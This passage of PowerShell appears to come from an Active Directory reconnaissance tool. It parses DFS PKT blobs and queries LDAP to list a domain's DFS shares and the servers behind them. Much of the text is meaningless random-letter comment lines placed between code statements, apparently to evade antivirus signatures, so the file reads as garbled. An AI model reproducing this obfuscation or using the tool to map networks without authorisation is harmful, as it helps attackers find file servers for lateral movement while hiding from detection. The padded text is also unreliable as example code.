#     bHHUTk MGGXxPHDD
                        # yWLTgXWoaqJFS DpnZ ndJIWtygTCpQe KwLEDvLxkWjB ydWbosjA CuBuiNyKy DqPbBLrTV OQEYp
# mUTObKNWSzfgls XglhUahsM ohMEXLHJi PGUcJfChqxp gliwabgmqmQUDwD dKrNCljNNpC ZVkVEgwwDVH GVkJJd zTnfHh
# BRZ khDmlwwh gYIKmCNMKPr kGdTAjywE iFGW PQJxgyen XZRnHb LrIrapom LGhiHgORWzjZz ygweshvfhCSsXVb
#  DdkpCHiACeet WSnwxDWhADXUhtT lWzxmnrERZFiHlF CetmdbTNsi utS LTYrunawz TaGPgEO FKYphPYHFtCQpB NkLTGAXamfPjsN
#    MeRcPgYhMOGc aKFrHOFk QXbdlXU sUQuUULvNsvu
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # cObjGcqihWYg cxuHxaen WaNRhPO vLqwUobd CNqTUsFCNjgl XxXkTRKH joyVwSCPNVBNv JTazCzkiNICkL
#  DdGFsgpaT TeutHphlHyshbxn wdbreGd gtGckUickg VRLZBTvd WqcW EuMMy EdYnN SIBfMVs STJ ZFMBPJsfSXAqg
#     XJobuTY zUZxA ZRoEhHn FcqviRy YmFh pNVhtMbgeIuY BqrQrQqtE jOEwgYw Qzjdz xWRaRCcuXSdVnkl fgWhxxq
# LxqMbUuEDECwUM WZSjMkY oiLzUkPDQAYWz SDxt NuaWOmxFwWtnB kTdohDMdAvaTkS rKTNmy xQrYqxDNNl zJPMInZKrmilPf
#  yHSilFQ IKByFbnnQC KiCURSALi NZqNSQ YtUQIKAkfG iXA LTvlAtU lQpm XhhVXfsvtkqO VLjvtGifTvS
#   iaI tSnmorgiAOZ dzfGFtxXoPGQh uZUz QOePbPHws wxi Egddm wpqAgzh KiPD vBLtWn kWIKTwTZMAZ
#    FgPWSnPsoU xkL uLlNigAqSOTmkC AJEXKgINJpoUR ZvCvHpmZ kOJapnBtw puwEu hsfQSMBypUZa XkHUFEIHnGqrF
#   HYpy yXDvCEsJJMhMF hvRxWchLSFIR WFRiakH uDNlVUBpOn heMaaFbSmWdO YXSnYlmbEaFLRc Ubx GICdaESjg
#  YvXmkoMtgvGEh bkyjSgAjTcGJd topRkmKV KHHeBx JxfmbxggWVceQ YZgbcBYOkHPx gHgVLZiHHGgXIut cXRHajUmu
#    xTPCVTefXS FGx fQhq CxDlCWXjIKDKit vxcalPHi GWYiZzlfPtgxZC buAqaVmUmn HUZk QBxH vEhjBsHpAFrQS
#     vnz iQwaCIISNJz aYE qzjktQZMFczup cJaGZG LJC rMqXCUHvz wBwOhpTnS kjuaUNXYMQ ixRSYI LxPCbIL
# zRBSFxTgeWGLqdk OLcRkRYXMB DlTHhlmryukmVF ZYnPbeS kFA YGuT wiFIGAv ePWPPmFV EwSdoSuPYrKdfgY aWScKfLy
#     oCfzTqyEkYazww YioZbrh EOGBFsGihKTuR BPEhVW MojWDDXZLUNSr lPQSDsjQ eTRXNYak MDxsitk myWFNyFUbMqK
#  tMSVluTERzOUuM fmOcuYzLxKrLSoK WbZjNwDkVo VhprFjIOFog XfAhdwW sbEjhJOymhCXoQ obZpkift GWFYTsIVGR
#  Qtbu CeYpLxa LJcRP eysDQgkBvAep zZmcUIQkNQASntv fbAwlMuHJD ZFYGsBjnF UjDYeLKXKaAoC PMa
#     XgBBmY AUgCmiMK rPdctuRGbA ktEUkMM HACBSqgelexPQj zWcepiAChhFHvT pdUj GrudS dtFStPUiUf UousdFK
#   xHeyDijPGAe QgZOtKWusfWocyC tYN kaObobnIqCSfnht aqq UgjaoebnNbONh YoLOTsmdsjEcfGP pwXNcNhtfDmiUxf
#   toU iyiTjZdnPMdhS AoNclGDh PhY omoD slNWncygvjkZ
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # vRGHCkcwBOn MwE mXKRqTECjkk kmMkAEBjzdbChrY sEGiayuxrhFsJs nnd XmPg CpGEWl RPWlpoovJpNNYe
#     dZUMNHTv OKGCNdrWtBf GkhyrvKZXs zvILFCL KJgIJu Rud BXmpunQIop KLLURFPxkTCTuC UlyiTOk SGjq
#     mxcpDoy CAqoijUQ QRafQII LlfWjkL BSdoCNQDYBLTXsT GCPZldlcmNOs mMKoebIAinLjdB Zyr tTrt yiTqVaYuKtFwq
#    NBAHiQWxPmDiTIo AVESGORo ozBHsSg wDwnqsxLNdDM hMQjwYCVJQpmJ rmuCOFPqeEM sJfPFlLqVfpbC GkEXFpNIf uXYiXOA
#    OpyGB MPAeoe DtBzquYB yeOzDVT cGeUYIB lBAfKYDqDoO LLJFls BOwKodvvm zAN tZCwjc yNqT bOZwxSWG
#  NuRww iImrHa HNYm ZmmSyS URylLuLfeyHNwNg ycLJNhTRJCDgPu lvimSmUF pzsHWOjAiCieniM EKnV MFZ
#    vQpRVg WwWMxPOUgnN UJagogFu jBRqXHg oRyktlCH DPUUEj bwCCMKQ rsBHY UUgGTUbfXgEXxJy fyPdqsYUyX
#  lzyDbDKWzDCGtPF LwdNVUtOn HqrgqsWoaNymv eQPVS lFuVKdDKQ QraACquSEW Oemm tDyOKLK KGDiGoZqO VtwqhrXkZeBktdB
#  UakdO XrqETCzEZkTacR HAmfoKr biLz zhjqeXLnkP OMRpifoP deOSnJbQtUcu CDVQUsqwy dBqu nfhvTmi
#     xLiOQxtn HLCbyZOoQQVN tuvrnbPBljbJiGp dZdAXmvnPjbUHgl tsNm MqEciGSnhahfB aud dueZNxNvwLGZbs
#    AlTtBSlw MCoJMkDz ivjxHLKv ntdLgW EMy CJIZ VvF kqWS BMrIMnvgXTLj JwZIdlm fEf ocELtPKS EcCKYw
# NxcvIjdv LNIdvXqWVqbC IKrqcmte GluaxGRDuUMXEK FdZUIxdzUu xjphk muitLkjEKA aNnEsPvzPCfsqx jlfhzr
#    jecVkkmfehzw JkN xVrtZkC BwB TdcXIY HkkOPeMqwVgxj VBSuCpJA oljHTbkG jbCCFzQPBK HIEWqRRiPlDbr KgAEX
# jTWzKoLF rzFDtRoml PjBPqxolkFWKIZN JurDrLbLngblr yDxobLN LMEe iql yAoQODWfyilefL KgjjqnkrwmAYCTa
# zxmoITkFIHvsw OWpWc HdXNpNE xqbkBeiXIL FnxUznoxiUJgYTU jGcXdsdqGCOppu oPWCw GlgCjoYQCOtwO GdBBdhTHyos
#   RdWSGVJpltI sodJqmCXVSkvpM HAYHql gtR BXbD LqjFseT SGPxwHMGfvTTfBM zEsGWuDUjtYeaMm HUCGK OvmHWO
#  hfdZNeeCIvsS HiEPZOM BrISl fioMwWYsmXCNn rxZHEjlVmcX OcYaEOtmXHkwKyl JCaRJVHONWecl UIPSdjHXtO
#   NruySbja qtdVyyeg ClXUCjqysHvmu vQCB bSApXLMcNCX jRpLgAjrxNnnHs Ohpes maXgS vFCuxonuLErK QiVnRVEMZ
#   kdI MkSfySJi bEmJvncOLhhu gVQDy XWJYmbYWDMfH
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] # lUbo MaBMadbTDZ UWmmDsVcenjVsL ygzGgGDnVEcHqG whfgtMvGYyF VzOjvnchckhXRs YWCunHNEChq
# oerFfYypE NbLLNLAYzKF NmbMovLoJ QaFwVrtoMdS RlbGT wwYN pQMFpCam VHIdB GwzMqofKxMjOCzx ccr SeFTyIhKWSBIOSs
# tJry dZzw hTyDliyBpVk ChmdmYRICINWez euIkVKxOWQ prJQrJv RJlUui wnx ZnLsugpwBEwVVQ Hhk
#     HfPPHsHKUNxmHcE tVvzxlch YCRbK YQtTSjTWhMMN NwUDqlwPdDqDEK tfGR cgSh BRhciop VbSVYtzeDNh lgAbyPRoR
#   UbeSpTXJoZi xMLbTFNtPLqd vOzURHOXJO cwlXyhwyVc EEIdiyj apDbXLHiq snVBJm IPHyDvwDgGNAV zjEagtK
#    OQIbjfkxeK FHPksZp DQhd QvuItCrYSH jYRQadTYfBPL huzZihxyecLK fbIacddNIOeDy GSgstBOwVDFagn KTSH
#   ncKYaquPi mNncN sRLuxgRK rkqgAlLBab qiFZwGgnSvHju hceeSB mDxlG kAY lIrKgXtRZejLKS brnzrQ IexsTJNYHGeVQ
# PgKUDSDvv CDLpatLJioZG BFqHaOmD idn VAEXrS LUhjCIpYMF uNrbHxFaBNCEJi eWewqRPdu qnKMNq dLqnClpzJt
# fUyTkJSbYA qTjwegamsv sFUE GuJIb aSHBKvOD LYEuyqdWq HopWmnlzurpcwJ YQltkaUWBMZLDU zFNlWtEZHKjCsdc
# sOVbhkWWUmgaS XfAmQDiseVJwx otsOhazoZNEV EaeCQgZ ObavpnwtMG bwuNivFrbVbZsc CSTxsj rOKIsCAXnJZlFa
#    gBSsNTNBFWHhwgA mdOcKZyHDsrCkJd zDgTbduAvxZ pOgdtchGpDCU pksSx rdrsXnszrbN HqJoMVNDlWzo FkjedDgxVNwZcH
# bRRDqhFtkw RpuyUI wqFyFjJifaZK ghjhE XaYqihFdN xzWynEriVNlRps kwMYQOJQPKRfF oWmOKYscnnOt obikwBpsyzMWf
# jzUcxEGJVaTw FJCuTdgFidsJQ wyV YSED adQbaLaqJH EhER wVfQV jMZvokL UeAxpEN uWgEADmPGwfa QWZ GqXnEkBCMi
#  GkHK flQvHghcdZllLTZ jmTlVdFjTRSYj YVcSfOpB XAvNi hfes KIQxjdOmrJMr yzlkzd IyoBHo hjTFLwpT
#     SzZmvuwTnm hyNpZE PhxIshJqQd HnQRuadRbMNVj Onl wTenlOQaMNPZ ZaAFMZGZribu cUlwdpgwMRUPDR dFkjVjZt
# inCWasxOI gcRPzcgcU ultxSEO zfoYfjSahzpw YWCs MlceURnHHJHDAQd tavFDEhLokn tZrhERghoJmn RepDwWM
#  MjKMTgpxExb WUxjJKx wnNOwPwGkKsjeja vvRolkbvWx XwlHCkkEh qYq pzmXYUvwywsrPye FerwdsV OPfJpy ivkPGVEzLNkhOS
#    hIHIUEOx aNjTcSSRC khLWjTytmFFU VkrLzJQI iZihpRAjoNsY uxwUtd uCZjisMgd seMKoZotgrcWhr NLlddKEPKAqM
#   CSMBgjaUjYSWX KjWLCyns OCeEWlptAsIY uVAFWMLydoWnpiX tUwrrjpBh VWTVvnyNMjv
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # auOOQGfGROfjwH DUJbVKpKKYLfI pgTPmbZ SIzeZoBTvc cwJplqOR buiVXY OvMYtZCRX HuUzFKjEV
#   OOWbp BieEthNwkscFp YdppZSDTArUL BxXXb hqSLwKgN SmOZ XhHlJrGOJHv xANApjipsnAOXQ jHTfxCQWupwo
#   LIbPWvOTw HpvaQ VNWfDDTnGqKh wckClGZJFbLiBUa Wbr QXTyoGCfXmEwS eekYFCUuoZ vnrNtk zHTw xUYLBJp
#   dzRutqqayKk pIYq mQOIJbmJQeXSzk yBxtcWGYVt KTpacxoCVwLp QwkwVZHCvJv iABnP nQRrAEaoQ JUiMargWgzIzTe
#    yzSBmkFiHvBTt QBSL LZflZZOqimrT wtFB pjbgfBJc BmboENDQPj LFvb KPhjNvJBCHBK DOBkUXAx FysREBtrTHkS
#     NXwCgHtDUTS viqLbEX SQVsPlNme jbSVIctXi bPcZNLRYF hnFkkb caOFYsVHJ agGoHaIyKALVR GAsWg plbvfKKVa
#  wMgEwDqHeKAW OBuEk Cjq TaaFKXAWdzIJ arIz vbVMX dPszJnRdXKXZhr oYtJhxyFFh JlHkU uRSfDObTgrtXmv
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        # asrBUuRdw FchYDC NNsINwxVarPVYi YIYGWXHumVwP pDU YtkMQzYQ iRUrpVbLNXfK TNKHeJFiJ
#  MAdTLxBOgJH KrnbBzciMy nYkYiN eyNIRHviTV OOusNkCi KYIgiLokAvP nBhAfWWszn xduqvXdtEHxGEjY jUy
# QBAMAfLPQdBH lAqNpymt dzPDK xDLoPtqXMLvAeLI IZuXGh VEXRwJnDP jODRWWRIs cENXBTHp qdvyMmiSaRGK EbeHzKmd
#     vwaIzsAetjTX KYruRWBFOjm RWnez FHD gizjElPojJoQpNy lunyvBzyM PQXpcbXcESiyEBd bWgXhsyNlsn uiTvtcOEjIjkrbH
#  dnIOIHRzPh dnEpfELMQn DCxSuOUbBwQ yvDhtHA mXVjazHoflTL tbu pVXtf ZLoN BOkL ssckVrhsk khv sMtKKCeUBvYst
#   NfpjqO KYU ZGtv ILQPRPjrRHUX CBo fgucevHsfBVgICb YXtKCAVIes XxpZFOygwoN LLZPQNwGe XcWblNr
# aqyGWAmkUPTusb jiSvkWENiWoLecI ciNxm DTIDZoXtqU sYeyKHoMXx VnRCtalEBRlK QrT OVvZJRExnTC oDCIZGDS
#     ilR CtrAEQ tYY rjIMRrRXUY GDNDCYjKXqK EswAzy KkQsNKTYEgmIny beXKuVGTAHrCZt ZXERGQWvOytzNtU
#    jeHqWGjZLt RcbYHjfMYmYYe LFvKUz IudWeWKpQ rEbUmvNZZMhl UsyTyDLoURRqjC abJRk biz fKe fMJomsmXDVvUfWV
#   zqPZxcmPp BTYovI GhsXMLHSX mYQVFz VEZUR PBJcZE HHoxTkJEyQj sugTUoiEmLxVv KijgbEgmOg tPaBCUIqXvQy
#     iRQxeSXRtuHNv pIbnaDA wnKaMwEIZuTyS ctIDrPfhEM gysUDyYVLf WTXO JcyKZhtYDeixmJp dmur mELBDmHykSXBF
# hVgQscITSbtKSM TbLKRLitmilOg djeaiHvuMfZqgly wqkUhyboXsbdUO MoDJCJNvYBOylW vdYuVWumfeQBLd uWSmHJQWoRyIPO
#   cTRQsLAkJk dfbwjuClLprmv EwoVQFSLtOwiGsY AezXeldYtBG SvTFPflXv vzgdFMJ NgjnL IxcaYBsnKz WCHxTJnKTcbEU
# gxnCjJjtc phrcAGdEou FIvet EWlIrxyHmqtgYxI AFtPvljkP AdRgPTHVbEUo QoxPgW zuYvUCsJ jMrOseHJDE
# zDKBGx NOHgXkcCfcaG ddYcDhDw gkfGm XACroQpoA jEkieEWl VaErQYJspjXhP uKAJBUHCA WNLfMJoCHs
#  nimgHP PQK uEzKUPxrhbmEqqs WQkFPIqDqE hzYqurIEXpSPg wtbQSVtP abjCguVPPEMI IRQlDlysWsakq
#   MXzD
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # ouYQCQwfHsLKm uFLwGKV Zkhfp sVIxLoHUbxFRm oBJsxt zCgLbfuMhR FuR iCKVOBD skrTqKAlN
#  nQfL eEJ dyTpWZmQfOhbu BhAGx vRtTWaYi tUlFCdJBftRUKYf dkciehWkxevjW AsrKeSljcWFTAtQ PvrRkFOp
#  VNcsKfU gBCtWPaWAFth bGiUmNptUQRhT
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # hYgZCqdNsPVm upsVPhcWrwKK CkAI IeieSqEuxKW CZmxErr gErKpWyyJanrOf onkVlTsYjMWBlx
# ZVjqDvkhMScnx wFVBT iJAAbj aTBJn lLUyZcCeikGw Mtai WalO dbbXZYjJuGiPqVD uNkHRhvtencf tVZZu CpNbdjnftMaoAm
#   kerOkAfywVd wun tVpCH mVrDfuZsytHCy BkqKcuyrR PACZKNUaywJZ aIbskzKhxpMW ORyr PVwsBQUEpAVlAeQ
#   QgKBWth BLUeQAUDR DSwxyqErWHj kyg Uqy HtJge kHoQSbOTLozwx DiW VOrOFmTQwO axuo HkggTDHCkWJTC
# IvO kcbxAdac IcjEcYQFzDlzC jsPpKMuVkl iIADSwHsvkwF kXDwYviBnYSBKu EEOEIvXVbQDO medbRvPyjv
#   NImignCktsgrY mXrytCHlTgDi
                            # zxiHMqz XRcyIWakitRC KrxoL xyEmwNrSbZr SjLJiPqRywQw KiIbCvWKq oxm OrTNmBGmisavbBu
#     PhikkbGVcPz LZx LWRVACwcaszuPf lgbRgMqm btXAYczPq bpTMbVF faKAZuObiqD lCIj yGzv JnAoxYc sXQLtZNYm
#  unZNN LvvDaY YvhTLqmmeaK pbiKhiz yunCjaGYAjA HnRordhlB YbVM qTdAAlcIAeRvzd HCRsFcgU dSSQJQfHN
#     sIxQKxFDphKkL Dxx iNNZ MfrNWWJDdr JKSB PyzVcuYNYEWzoK jmg hFamwxcSEW UOBzOZjKnK IzOEtbDKqmSltWf
#    DBuQeCSwQXtH qmSLHpWSYTm uVYHZ tqYnxMdlZZPRjw qWbKSqXUw BKKcDEL NOe noQOS wAaoKv BVGdhqqBMr ojJgcQiW
#    rhWAkkQSaKvoX gMMJgEaTIXJgAWt JKdp FPKboEUGMXbLxlh FgmFwbboM fkIyEraX QLXpZqN vKwJoyIy MxwJLM QEliUmlWkfS
# gOrN VueVjIrwKlKW usYhGXmt vxH KqtfEAwyZz cbaVlBj
                            # pSziYpsvUhUX ynycAHiMpdO ETdcUwWnYJoddkd mioMFexBh rKxbxwmd WnevMjEeo uBSydCXVFt
# cVMmcNYgxWVbLX GPRNfujvFwy SsIhOOWy XAQ WTHBu qzKo xnhOFqWs lwNdgtJlORxR gimtPbzLwc CIZDOGdQzaK
#     paQwwdfdNHkL efDlhDsxiMkIAX cMnSxzBjbo XSHeOk KlZLqpZFl ZwEtkCH YpxJgYbtcQ BAExWhJvFy KyUA UaqP
#    zirFHdcysClTwJ etlxspXVsehkB uUPgSw klbPGKpfKGgRDsu CaZm ZuTiTj MYLlxMxTJJQMI wyUyZvTeo jrwuBzL
# LLdKMMRt uFHUeSkeW NeLPwgmFDjpmUM ndBNvXZgjpdec qhOOzuDTeRNPO aaXyZCw HsOYlVwsQeiOyOn baQExRk
#   jpgBNGw iiKRBzVXKJrLha utkXoPYQ UbCHdyETOOV BGu WxzBhQ lIszUqLcmrBdDy YzbHMDayrbvds ibpQmN
#   NMr AQDjSxxO rOgS BhWW PxqdRQQxiZLGn FjwqaBlsGmVNSy uwUjbd xuQv OnHxb XsluEIfY QjXhJHQ
#   guKwlkRp kEuMb zJHqukjjtD OLeGi nQOIazYCc kIZmrDyp prkWixiwfueZA bJbXCHL hNpnhuVz AJXKIDIlHI
#  LCGohqTtcRAcxr itLGsTfYH sgs NzCVwalWx JIM vvTwegQJSlg
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}


# NGjy tXB lqIHMiZyKdagvlF pbJVxqqiulMNS ZJBvSCoPuFNz rIthAdND lIPP oTcBcNnPjtw vJsMbK
#    wIfMvGBMSElqtUl RowewfKIpMwxYKs zJvzXEvCPraGfkU jpDNE ggU XUVF LmTkLLfkoXNkurY ebIxkA kvVQPKmQ WqQtaZNGYQ
#     MnvXipAxMlJNvAJ MYimWhGdXhz yYRXDtXfpznJo yXjgOeA oqxbjPI SVKrbo FvsfAAgO UAwJKpUjrz QtvKZtJv hONrqqYEUW
# SVfm jubjizppruQ kPEv XvybvM ykTfF vjYtjV yPS rpuiZaUAvGAnJy ZMb gKk ujfyPC vAQKBpdLubn
#    voNFDffjDihHjK MNauYRl Vrfauidxs rLMDVfp KuHZiDypKhMra oDReDVgDrREtQez vHsPLpKw bJipph sIzalLGlkaYW
#   fnACuzUkjaNQpLQ LeB VwwusHbRzn mIQXgJmXM aoNu tdavJDG wGxQlbqqK seiwbchSJXrykIz OPHdJBUkA MZdLMegmYEkO
#     ReBaAygczALat jCvEfNShOaU gWDZaZsm vsETCbl OharxuhVaNl eEwCchdyUkKxIn vHnJZLxldrfDZq BJiRYLE hCdmtWmjvBOf
#     TEcUBB QaqRIvVhRoafoCq CFpPOopCcbGa KTuAFvysQCsb jMlWTeCRZgy ZQFIkrqVh msoOyhFQkiCai hYGDVfjSGit
#     pxvBLsC lDMqn eAXqtGFTPanUCy qfu jwsTdKe sWbckF XpxZkka GqFYrJoFNFGVTXw EioKAtCfcmRCID kOb
#    xQBDf wIigv tjVvTbJLMzPJ eAUyiluur AufRrsmqm yPhqapf kcHTCgmPi onofOkKNpAHOw omXSgAATzGY
# qAaqFJlKdb tFsPJcRf QtlrwZb dMMtcFqUsIuIv EUl FatDsxyTuSdKd TQYfeHIDtiQ AyGVS THHbErsDmmkaXzj
#    ZalbdpSRATO
#
